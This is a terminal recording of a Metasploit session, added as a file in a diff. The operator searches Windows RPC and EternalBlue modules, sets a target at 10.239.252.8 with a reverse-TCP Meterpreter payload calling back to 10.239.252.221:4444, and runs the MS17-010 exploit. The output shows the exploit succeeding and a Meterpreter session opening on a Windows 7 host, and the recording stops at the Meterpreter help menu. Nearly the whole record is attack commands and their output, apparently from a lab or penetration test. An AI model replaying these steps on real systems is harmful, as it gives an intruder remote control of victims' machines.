@@ -1,0 +1,709 @@
+Script started on 2025-10-05 10:26:10-04:00 [COMMAND="bash -ic msfconsole" TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="116" LINES="61"]
+Metasploit tip: Network adapter names can be used for IP options set LHOST 
+eth0
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../                                                  
+[0m[36m[0m                                   ___          ____
+                               ,-""   `.[33m      [37m< HONK >
+                             ,'  _   e [33m)`-._[37m /  ----
+                            /  ,' `-._[33m<.===-'[37m
+                           /  /
+                          /  ;
+              _          /   ;
+ (`._    _.-"" ""--..__,'    |
+ <_  `-""                     \
+  <`-                          :
+   (__   <__.                  ;
+     `-.   '-.__.      _.'    /
+        \      `-.__,-'    _,'
+         `._    ,    /__,-'
+            ""._\__,'[33m< <____[37m
+                 [33m| |  `----.`.
+[37m                 [33m| |        \ `.
+[37m                 [33m; |___      \-``
+[37m                 [33m\   --<
+[37m                  [33m`.`.<
+[37m                    [33m`-'
+[37m
+[0m
+
+       =[ [33mmetasploit v6.4.84-dev[0m                                ]
++ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,680 payloads     ]
++ -- --=[ 431 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+[?1034h[4mmsf[0m [0m> search Microsoft Windows RPC
+[0m
+Matching Modules
+================
+
+   #    Name                                                                Disclosure Date  Rank       Check  Description
+   -    ----                                                                ---------------  ----       -----  -----------
+   0    exploit/[45mwindows[0m/local/cve_2020_17136                                2020-03-10       normal     Yes    CVE-2020-1170 Cloud Filter Arbitrary File Creation EOP
+   1    exploit/[45mwindows[0m/dce[45mrpc[0m/ms03_026_dcom                                2003-07-16       [32mgreat[0m      Yes    MS03-026 [45mMicrosoft[0m [45mRPC[0m DCOM Interface Overflow
+   2    exploit/[45mwindows[0m/smb/ms04_011_lsass                                  2004-04-13       good       No     MS04-011 [45mMicrosoft[0m LSASS Service DsRolerUpgradeDownlevelServer Overflow
+   3      \_ target: Automatic Targetting                                   .                .          .      .
+   4      \_ target: [45mWindows[0m 2000 English                                   .                .          .      .
+   5      \_ target: [45mWindows[0m XP English                                     .                .          .      .
+   6    exploit/[45mwindows[0m/dce[45mrpc[0m/ms05_017_msmq                                2005-04-12       good       No     MS05-017 [45mMicrosoft[0m Message Queueing Service Path Overflow
+   7    exploit/[45mwindows[0m/smb/ms06_040_netapi                                 2006-08-08       good       No     MS06-040 [45mMicrosoft[0m Server Service NetpwPathCanonicalize Overflow
+   8      \_ target: (wcscpy) Automatic (NT 4.0, 2000 SP0-SP4, XP SP0-SP1)  .                .          .      .
+   9      \_ target: (wcscpy) [45mWindows[0m NT 4.0 / [45mWindows[0m 2000 SP0-SP4         .                .          .      .
+   10     \_ target: (wcscpy) [45mWindows[0m XP SP0/SP1                            .                .          .      .
+   11     \_ target: (stack)  [45mWindows[0m XP SP1 English                        .                .          .      .
+   12     \_ target: (stack)  [45mWindows[0m XP SP1 Italian                        .                .          .      .
+   13     \_ target: (wcscpy) [45mWindows[0m 2003 SP0                              .                .          .      .
+   14   exploit/[45mwindows[0m/smb/ms07_029_msdns_zonename                         2007-04-12       manual     No     MS07-029 [45mMicrosoft[0m DNS [45mRPC[0m Service extractQuotedChar() Overflow (SMB)
+   15     \_ target: Automatic (2000 SP0-SP4, 2003 SP0-SP2)                 .                .          .      .
+   16     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ English                   .                .          .      .
+   17     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ French                    .                .          .      .
+   18     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ German                    .                .          .      .
+   19     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Italian                   .                .          .      .
+   20     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Polish                    .                .          .      .
+   21     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Portuguese                .                .          .      .
+   22     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Korean                    .                .          .      .
+   23     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Russian                   .                .          .      .
+   24     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Simplified Chinese        .                .          .      .
+   25     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Spanish                   .                .          .      .
+   26     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Swedish                   .                .          .      .
+   27     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Traditional Chinese       .                .          .      .
+   28     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Turkish                   .                .          .      .
+   29     \_ target: [45mWindows[0m 2003 Server SP0 English                        .                .          .      .
+   30     \_ target: [45mWindows[0m 2003 Server SP0 French                         .                .          .      .
+   31     \_ target: [45mWindows[0m 2003 Server SP1-SP2 English                    .                .          .      .
+   32     \_ target: [45mWindows[0m 2003 Server SP1-SP2 French                     .                .          .      .
+   33     \_ target: [45mWindows[0m 2003 Server SP1-SP2 Spanish                    .                .          .      .
+   34     \_ target: [45mWindows[0m 2003 Server SP1-SP2 Italian                    .                .          .      .
+   35     \_ target: [45mWindows[0m 2003 Server SP1-SP2 German                     .                .          .      .
+   36     \_ target: [45mWindows[0m 2003 Server SP1-SP2 Russian                    .                .          .      .
+   37     \_ target: [45mWindows[0m 2003 Server SP1-SP2 Simplified Chinese         .                .          .      .
+   38   exploit/[45mwindows[0m/dce[45mrpc[0m/ms07_029_msdns_zonename                      2007-04-12       [32mgreat[0m      No     MS07-029 [45mMicrosoft[0m DNS [45mRPC[0m Service extractQuotedChar() Overflow (TCP)
+   39     \_ target: Automatic (2000 SP0-SP4, 2003 SP0-SP2)                 .                .          .      .
+   40     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ English                   .                .          .      .
+   41     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ French                    .                .          .      .
+   42     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ German                    .                .          .      .
+   43     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Italian                   .                .          .      .
+   44     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Polish                    .                .          .      .
+   45     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Portuguese                .                .          .      .
+   46     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Korean                    .                .          .      .
+   47     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Russian                   .                .          .      .
+   48     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Simplified Chinese        .                .          .      .
+   49     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Spanish                   .                .          .      .
+   50     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Swedish                   .                .          .      .
+   51     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Traditional Chinese       .                .          .      .
+   52     \_ target: [45mWindows[0m 2000 Server SP0-SP4+ Turkish                   .                .          .      .
+   53     \_ target: [45mWindows[0m 2003 Server SP0 English                        .                .          .      .
+   54     \_ target: [45mWindows[0m 2003 Server SP0 French                         .                .          .      .
+   55     \_ target: [45mWindows[0m 2003 Server SP1-SP2 English                    .                .          .      .
+   56     \_ target: [45mWindows[0m 2003 Server SP1-SP2 French                     .                .          .      .
+   57     \_ target: [45mWindows[0m 2003 Server SP1-SP2 Spanish                    .                .          .      .
+   58     \_ target: [45mWindows[0m 2003 Server SP1-SP2 Italian                    .                .          .      .
+   59     \_ target: [45mWindows[0m 2003 Server SP1-SP2 German                     .                .          .      .
+   60     \_ target: [45mWindows[0m 2003 Server SP1-SP2 Russian                    .                .          .      .
+   61     \_ target: [45mWindows[0m 2003 Server SP1-SP2 Simplified Chinese         .                .          .      .
+   62   exploit/[45mwindows[0m/dce[45mrpc[0m/ms07_065_msmq                                2007-12-11       good       No     MS07-065 [45mMicrosoft[0m Message Queueing Service DNS Name Path Overflow
+   63   exploit/[45mwindows[0m/smb/ms08_067_netapi                                 2008-10-28       [32mgreat[0m      Yes    MS08-067 [45mMicrosoft[0m Server Service Relative Path Stack Corruption
+   64     \_ target: Automatic Targeting                                    .                .          .      .
+   65     \_ target: [45mWindows[0m 2000 Universal                                 .                .          .      .
+   66     \_ target: [45mWindows[0m XP SP0/SP1 Universal                           .                .          .      .
+   67     \_ target: [45mWindows[0m 2003 SP0 Universal                             .                .          .      .
+   68     \_ target: [45mWindows[0m XP SP2 English (AlwaysOn NX)                   .                .          .      .
+   69     \_ target: [45mWindows[0m XP SP2 English (NX)                            .                .          .      .
+   70     \_ target: [45mWindows[0m XP SP3 English (AlwaysOn NX)                   .                .          .      .
+   71     \_ target: [45mWindows[0m XP SP3 English (NX)                            .                .          .      .
+   72     \_ target: [45mWindows[0m XP SP2 Arabic (NX)                             .                .          .      .
+   73     \_ target: [45mWindows[0m XP SP2 Chinese - Traditional / Taiwan (NX)     .                .          .      .
+   74     \_ target: [45mWindows[0m XP SP2 Chinese - Simplified (NX)               .                .          .      .
+   75     \_ target: [45mWindows[0m XP SP2 Chinese - Traditional (NX)              .                .          .      .
+   76     \_ target: [45mWindows[0m XP SP2 Czech (NX)                              .                .          .      .
+   77     \_ target: [45mWindows[0m XP SP2 Danish (NX)                             .                .          .      .
+   78     \_ target: [45mWindows[0m XP SP2 German (NX)                             .                .          .      .
+   79     \_ target: [45mWindows[0m XP SP2 Greek (NX)                              .                .          .      .
+   80     \_ target: [45mWindows[0m XP SP2 Spanish (NX)                            .                .          .      .
+   81     \_ target: [45mWindows[0m XP SP2 Finnish (NX)                            .                .          .      .
+   82     \_ target: [45mWindows[0m XP SP2 French (NX)                             .                .          .      .
+   83     \_ target: [45mWindows[0m XP SP2 Hebrew (NX)                             .                .          .      .
+   84     \_ target: [45mWindows[0m XP SP2 Hungarian (NX)                          .                .          .      .
+   85     \_ target: [45mWindows[0m XP SP2 Italian (NX)                            .                .          .      .
+   86     \_ target: [45mWindows[0m XP SP2 Japanese (NX)                           .                .          .      .
+   87     \_ target: [45mWindows[0m XP SP2 Korean (NX)                             .                .          .      .
+   88     \_ target: [45mWindows[0m XP SP2 Dutch (NX)                              .                .          .      .
+   89     \_ target: [45mWindows[0m XP SP2 Norwegian (NX)                          .                .          .      .
+   90     \_ target: [45mWindows[0m XP SP2 Polish (NX)                             .                .          .      .
+   91     \_ target: [45mWindows[0m XP SP2 Portuguese - Brazilian (NX)             .                .          .      .
+   92     \_ target: [45mWindows[0m XP SP2 Portuguese (NX)                         .                .          .      .
+   93     \_ target: [45mWindows[0m XP SP2 Russian (NX)                            .                .          .      .
+   94     \_ target: [45mWindows[0m XP SP2 Swedish (NX)                            .                .          .      .
+   95     \_ target: [45mWindows[0m XP SP2 Turkish (NX)                            .                .          .      .
+   96     \_ target: [45mWindows[0m XP SP3 Arabic (NX)                             .                .          .      .
+   97     \_ target: [45mWindows[0m XP SP3 Chinese - Traditional / Taiwan (NX)     .                .          .      .
+   98     \_ target: [45mWindows[0m XP SP3 Chinese - Simplified (NX)               .                .          .      .
+   99     \_ target: [45mWindows[0m XP SP3 Chinese - Traditional (NX)              .                .          .      .
+   100    \_ target: [45mWindows[0m XP SP3 Czech (NX)                              .                .          .      .
+   101    \_ target: [45mWindows[0m XP SP3 Danish (NX)                             .                .          .      .
+   102    \_ target: [45mWindows[0m XP SP3 German (NX)                             .                .          .      .
+   103    \_ target: [45mWindows[0m XP SP3 Greek (NX)                              .                .          .      .
+   104    \_ target: [45mWindows[0m XP SP3 Spanish (NX)                            .                .          .      .
+   105    \_ target: [45mWindows[0m XP SP3 Finnish (NX)                            .                .          .      .
+   106    \_ target: [45mWindows[0m XP SP3 French (NX)                             .                .          .      .
+   107    \_ target: [45mWindows[0m XP SP3 Hebrew (NX)                             .                .          .      .
+   108    \_ target: [45mWindows[0m XP SP3 Hungarian (NX)                          .                .          .      .
+   109    \_ target: [45mWindows[0m XP SP3 Italian (NX)                            .                .          .      .
+   110    \_ target: [45mWindows[0m XP SP3 Japanese (NX)                           .                .          .      .
+   111    \_ target: [45mWindows[0m XP SP3 Korean (NX)                             .                .          .      .
+   112    \_ target: [45mWindows[0m XP SP3 Dutch (NX)                              .                .          .      .
+   113    \_ target: [45mWindows[0m XP SP3 Norwegian (NX)                          .                .          .      .
+   114    \_ target: [45mWindows[0m XP SP3 Polish (NX)                             .                .          .      .
+   115    \_ target: [45mWindows[0m XP SP3 Portuguese - Brazilian (NX)             .                .          .      .
+   116    \_ target: [45mWindows[0m XP SP3 Portuguese (NX)                         .                .          .      .
+   117    \_ target: [45mWindows[0m XP SP3 Russian (NX)                            .                .          .      .
+   118    \_ target: [45mWindows[0m XP SP3 Swedish (NX)                            .                .          .      .
+   119    \_ target: [45mWindows[0m XP SP3 Turkish (NX)                            .                .          .      .
+   120    \_ target: [45mWindows[0m 2003 SP1 English (NO NX)                       .                .          .      .
+   121    \_ target: [45mWindows[0m 2003 SP1 English (NX)                          .                .          .      .
+   122    \_ target: [45mWindows[0m 2003 SP1 Japanese (NO NX)                      .                .          .      .
+   123    \_ target: [45mWindows[0m 2003 SP1 Spanish (NO NX)                       .                .          .      .
+   124    \_ target: [45mWindows[0m 2003 SP1 Spanish (NX)                          .                .          .      .
+   125    \_ target: [45mWindows[0m 2003 SP1 French (NO NX)                        .                .          .      .
+   126    \_ target: [45mWindows[0m 2003 SP1 French (NX)                           .                .          .      .
+   127    \_ target: [45mWindows[0m 2003 SP2 English (NO NX)                       .                .          .      .
+   128    \_ target: [45mWindows[0m 2003 SP2 English (NX)                          .                .          .      .
+   129    \_ target: [45mWindows[0m 2003 SP2 German (NO NX)                        .                .          .      .
+   130    \_ target: [45mWindows[0m 2003 SP2 German (NX)                           .                .          .      .
+   131    \_ target: [45mWindows[0m 2003 SP2 Portuguese (NX)                       .                .          .      .
+   132    \_ target: [45mWindows[0m 2003 SP2 Portuguese - Brazilian (NX)           .                .          .      .
+   133    \_ target: [45mWindows[0m 2003 SP2 Spanish (NO NX)                       .                .          .      .
+   134    \_ target: [45mWindows[0m 2003 SP2 Spanish (NX)                          .                .          .      .
+   135    \_ target: [45mWindows[0m 2003 SP2 Japanese (NO NX)                      .                .          .      .
+   136    \_ target: [45mWindows[0m 2003 SP2 French (NO NX)                        .                .          .      .
+   137    \_ target: [45mWindows[0m 2003 SP2 French (NX)                           .                .          .      .
+   138    \_ target: [45mWindows[0m 2003 SP2 Chinese - Simplified (NX)             .                .          .      .
+   139    \_ target: [45mWindows[0m 2003 SP2 Czech (NX)                            .                .          .      .
+   140    \_ target: [45mWindows[0m 2003 SP2 Dutch (NX)                            .                .          .      .
+   141    \_ target: [45mWindows[0m 2003 SP2 Hungarian (NX)                        .                .          .      .
+   142    \_ target: [45mWindows[0m 2003 SP2 Italian (NX)                          .                .          .      .
+   143    \_ target: [45mWindows[0m 2003 SP2 Russian (NX)                          .                .          .      .
+   144    \_ target: [45mWindows[0m 2003 SP2 Swedish (NX)                          .                .          .      .
+   145    \_ target: [45mWindows[0m 2003 SP2 Turkish (NX)                          .                .          .      .
+   146  exploit/[45mwindows[0m/smb/ms10_061_spoolss                                2010-09-14       [32mexcellent[0m  No     MS10-061 [45mMicrosoft[0m Print Spooler Service Impersonation Vulnerability
+   147  exploit/[45mwindows[0m/local/alpc_taskscheduler                            2018-08-27       normal     No     [45mMicrosoft[0m [45mWindows[0m ALPC Task Scheduler Local Privilege Elevation
+   148  auxiliary/gather/[45mwindows[0m_deployment_services_shares                 .                normal     No     [45mMicrosoft[0m [45mWindows[0m Deployment Services Unattend Gatherer
+   149  auxiliary/scanner/dce[45mrpc[0m/[45mwindows[0m_deployment_services                .                normal     No     [45mMicrosoft[0m [45mWindows[0m Deployment Services Unattend Retrieval
+   150  exploit/[45mwindows[0m/smb/smb_rras_erraticgopher                          2017-06-13       average    Yes    [45mMicrosoft[0m [45mWindows[0m RRAS Service MIBEntryGet Overflow
+   151    \_ target: Automatic                                              .                .          .      .
+   152    \_ target: [45mWindows[0m Server 2003 SP0 (English)                      .                .          .      .
+   153    \_ target: [45mWindows[0m Server 2003 SP1 (English) (NX)                 .                .          .      .
+   154    \_ target: [45mWindows[0m Server 2003 SP2 (English) (NX)                 .                .          .      .
+   155    \_ target: [45mWindows[0m Server 2003 R2 SP2 (English) (NX)              .                .          .      .
+   156  auxiliary/scanner/dce[45mrpc[0m/petitpotam                                 .                normal     No     PetitPotam
+   157  auxiliary/scanner/smb/smb_enumusers_domain                          .                normal     No     SMB Domain User Enumeration
+
+
+Interact with a module by name or index. For example [32minfo 157[0m, [32muse 157[0m or [32muse auxiliary/scanner/smb/smb_enumusers_domain[0m
+
+[4mmsf[0m [0m> clear
+[0m[1m[34m[*][0m exec: clear
+
+[H[2J[3J[4mmsf[0m [0m> search mrspc
+[0m[1m[31m[-][0m No results from search
+[4mmsf[0m [0m> search  eternalblue
+[0m
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_[45meternalblue[0m       2017-03-14       average  Yes    MS17-010 [45mEternalBlue[0m SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: [45mETERNALBLUE[0m                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: [45mETERNALBLUE[0m                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: [45mETERNALBLUE[0m                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       [32mgreat[0m    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+
+Interact with a module by name or index. For example [32minfo 29[0m, [32muse 29[0m or [32muse exploit/windows/smb/smb_doublepulsar_rce[0m
+After interacting with a module you can manually set a TARGET with [32mset TARGET 'Neutralize implant'[0m
+
+[4mmsf[0m [0m> use 0
+[0m[1m[34m[*][0m No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show options
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
+                                             loit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
+                                              Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
+                                             t machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Win
+                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
+                                             chines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serve
+                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.239.252.221   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> a[Kset rhs[Kost 10.239.252.8
+[0mrhost => 10.239.252.8
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> ls
+[0m[1m[34m[*][0m exec: ls
+
+extras	       logs			   raja_venv	     resources	   wkhtmltox_0.12.6.1-3.bookworm_amd64.deb
+graphs	       modules			   reconnaissance    results
+ha.py	       rajasploit_honey_conf.json  reports	     setup.sh
+hydra.restore  Rajasploit.py		   requirements.txt  smtp_test.py
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> clear
+[0m[1m[34m[*][0m exec: clear
+
+[H[2J[3J[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> showoptions
+[0m[1m[31m[-][0m Unknown command: showoptions. Run the [32mhelp[0m command for more details.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> showoptions ptions
+[0m[1m[31m[-][0m Unknown command: showo. Did you mean [32mshow[0m? Run the [32mhelp[0m command for more details.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> showo ptions[Pptions[Pptions ptionsoptions
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.239.252.8     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
+                                             loit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
+                                              Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
+                                             t machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Win
+                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
+                                             chines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serve
+                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.239.252.221   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
+[0m[1m[34m[*][0m Started reverse TCP handler on 10.239.252.221:4444 
+[1m[34m[*][0m 10.239.252.8:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[32m[+][0m 10.239.252.8:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[1m[34m[*][0m 10.239.252.8:445      - Scanned 1 of 1 hosts (100% complete)
+[1m[32m[+][0m 10.239.252.8:445 - The target is vulnerable.
+[1m[34m[*][0m 10.239.252.8:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 10.239.252.8:445 - Connection established for exploitation.
+[1m[32m[+][0m 10.239.252.8:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 10.239.252.8:445 - CORE raw buffer dump (42 bytes)
+[1m[34m[*][0m 10.239.252.8:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[1m[34m[*][0m 10.239.252.8:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[1m[34m[*][0m 10.239.252.8:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[1m[32m[+][0m 10.239.252.8:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 10.239.252.8:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 10.239.252.8:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m 10.239.252.8:445 - Starting non-paged pool grooming
+[1m[32m[+][0m 10.239.252.8:445 - Sending SMBv2 buffers
+[1m[32m[+][0m 10.239.252.8:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[1m[34m[*][0m 10.239.252.8:445 - Sending final SMBv2 buffers.
+[1m[34m[*][0m 10.239.252.8:445 - Sending last fragment of exploit packet!
+[1m[34m[*][0m 10.239.252.8:445 - Receiving response from exploit packet
+[1m[32m[+][0m 10.239.252.8:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[1m[34m[*][0m 10.239.252.8:445 - Sending egg to corrupted connection.
+[1m[34m[*][0m 10.239.252.8:445 - Triggering free of corrupted buffer.
+[1m[34m[*][0m Sending stage (203846 bytes) to 10.239.252.8
+[0m[0m[0m[0m[1m[32m[+][0m 10.239.252.8:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 10.239.252.8:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 10.239.252.8:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[34m[*][0m Meterpreter session 1 opened (10.239.252.221:4444 -> 10.239.252.8:49166) at 2025-10-05 10:30:34 -0400
+
+[0m[4mmeterpreter[0m > l[Khelp
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
